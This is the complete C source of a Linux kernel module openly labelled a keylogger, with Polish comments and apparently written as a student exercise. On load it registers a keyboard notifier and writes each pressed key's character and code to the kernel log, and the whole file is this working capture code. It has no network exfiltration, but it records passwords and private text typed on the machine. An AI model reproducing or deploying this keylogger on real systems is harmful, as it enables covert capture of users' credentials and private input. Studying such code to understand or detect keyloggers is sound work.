#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Olga i Kubus");
MODULE_DESCRIPTION("Moduł Keylogger");
MODULE_VERSION("1.0");

static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYSYM && param->down) { // param->down określa, czy klawisz został naciśnięty (true), czy puszczony (false)
        char c = param->value; // param->value kod znaku lub klawisza
        
        // Zapisywanie znaku do logów jądra
        printk(KERN_INFO "Key pressed: %c (code: %d)\n", c, param->value);
    }

    return NOTIFY_OK;
}

static struct notifier_block nb = {
    .notifier_call = keylogger_notify
};

static int __init keylogger_init(void) {
    printk(KERN_INFO "Keylogger: Wczytywanie modułu\n");
    register_keyboard_notifier(&nb); // Rejestracja zdarzeń klawiatury
    return 0;
}

static void __exit keylogger_exit(void) {
    unregister_keyboard_notifier(&nb); // Wyrejestrowanie zdarzeń klawiatury
    printk(KERN_INFO "Keylogger: Wyłączanie modułu\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);
